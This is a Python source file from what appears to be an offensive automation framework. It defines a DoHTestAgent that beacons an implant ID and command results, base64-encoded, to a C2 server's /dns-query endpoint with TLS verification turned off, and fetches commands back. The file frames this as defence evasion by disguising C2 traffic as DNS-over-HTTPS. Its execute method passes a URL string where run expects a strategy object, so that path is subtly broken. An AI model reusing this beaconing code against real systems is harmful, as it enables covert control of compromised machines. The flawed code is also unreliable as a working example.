
import asyncio
from core.data_models import AgentData, Strategy
import base64
import uuid
import httpx
import time

from core.logger import log
from core.base_agent import BaseAgent
from core.data_models import Strategy, DoHTestReport, AttackPhase, ErrorType
from core.context_manager import ContextManager


class DoHTestAgent(BaseAgent):
    """An agent to test the DNS over HTTPS (DoH) C2 channel."""

    supported_phases = [AttackPhase.DEFENSE_EVASION]
    required_tools = ["httpx"]

    def __init__(self, context_manager: ContextManager = None, orchestrator=None, **kwargs):
        super().__init__(context_manager, orchestrator, **kwargs)
        self.implant_id = f"doh-implant-{str(uuid.uuid4())[:8]}"
        self.c2_host = None
        self.c2_port = None
        self.c2_url = None
        self.client = None
        self.report_class = DoHTestReport

    async def setup(self):
        self.c2_host = await self.context_manager.get_context('c2_host')
        self.c2_port = await self.context_manager.get_context('c2_port')
        if not self.c2_host or not self.c2_port:
            log.error("C2 host or port not found in context for DoHTestAgent.")
            # This agent might not be able to run without C2 info, but setup shouldn't fail critically.
            return

        self.c2_url = f"https://{self.c2_host}:{self.c2_port}/dns-query"
        self.client = httpx.AsyncClient(verify=False) # In real use, cert validation is complex
        log.info(f"[DoHTestAgent] Initialized with Implant ID: {self.implant_id}")
        log.info(f"[DoHTestAgent] C2 Endpoint: {self.c2_url}")

    async def run(self, strategy: Strategy = None, **kwargs) -> DoHTestReport:
        start_time = time.time()
        command_to_test = strategy.context.get("command_to_test", "echo hello")
        log.info(f"[DoHTestAgent] Sending command: '{command_to_test}'")

        if not self.client or not self.c2_url:
            end_time = time.time()
            return self.create_report(
                errors=["DoHTestAgent not properly set up. C2 client or URL missing."],
                error_type=ErrorType.CONFIGURATION,
                summary="DoH test failed: Agent not initialized."
            )

        try:
            # Step 1: Send the command and previous result (empty for first run)
            log.info("Step 1: Beaconing to drop off previous results and pick up new command.")
            next_command = await self._beacon(command_to_test)
            if next_command:
                log.warning(f"[DoHTestAgent] Unexpectedly received command '{next_command}' immediately. Ignoring.")

            # Step 2: Beacon again to send the result of the executed command.
            log.info(f"Step 2: Executing command '{command_to_test}' and beaconing with result.")
            # In this test agent, we just pretend we executed it and return the command string as the result.
            execution_result = f"Executed: {command_to_test}"

            final_response = await self._beacon(execution_result)
            log.success(f"[DoHTestAgent] Final response from C2: {final_response}")

            end_time = time.time()
            return self.create_report(
                implant_id=self.implant_id,
                command_sent=command_to_test,
                result_sent=execution_result,
                c2_response=final_response,
                summary="DoH C2 communication test successful."
            )

        except httpx.RequestError as e:
            end_time = time.time()
            return self.create_report(
                errors=[f"HTTP request failed: {e}"],
                error_type=ErrorType.NETWORK,
                summary=f"DoH test failed: HTTP request error: {e}"
            )
        except Exception as e:
            end_time = time.time()
            return self.create_report(
                errors=[f"An unexpected error occurred: {e}"],
                error_type=ErrorType.LOGIC,
                summary=f"DoH test failed due to unexpected error: {e}"
            )

    async def _beacon(self, result: str) -> str | None:
        """Performs a single C2 beacon."""
        try:
            # Uplink data format: "implant_id|result_of_last_command"
            uplink_data = f"{self.implant_id}|{result}"
            uplink_b64 = base64.urlsafe_b64encode(
                uplink_data.encode('utf-8')).decode('utf-8')

            response = await self.client.get(f"{self.c2_url}?q={uplink_b64}", timeout=20)
            response.raise_for_status()

            downlink_b64 = response.content
            if not downlink_b64:
                return None

            downlink_data = base64.urlsafe_b64decode(
                downlink_b64).decode('utf-8')
            return downlink_data

        except httpx.TimeoutException:
            log.warning(
                "[DoHTestAgent] Beacon request timed out. C2 might not have a command.")
            return None
        except Exception as e:
            log.error(f"[DoHTestAgent] Error during beacon: {e}")
            raise # Re-raise to be caught by the run method's try-except

    async def close(self):
        if self.client:
            await self.client.aclose()
        log.info("[DoHTestAgent] Closed.")

    async def execute(self, strategy: Strategy) -> AgentData:
        """Execute doh test agent"""
        try:
            target = strategy.context.get('target_url', '')
            
            # Call existing method
            if asyncio.iscoroutinefunction(self.run):
                results = await self.run(target)
            else:
                results = self.run(target)
            
            return AgentData(
                agent_name=self.__class__.__name__,
                success=True,
                summary=f"{self.__class__.__name__} completed successfully",
                errors=[],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={'results': results}
            )
        except Exception as e:
            return AgentData(
                agent_name=self.__class__.__name__,
                success=False,
                summary=f"{self.__class__.__name__} failed",
                errors=[str(e)],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={}
            )
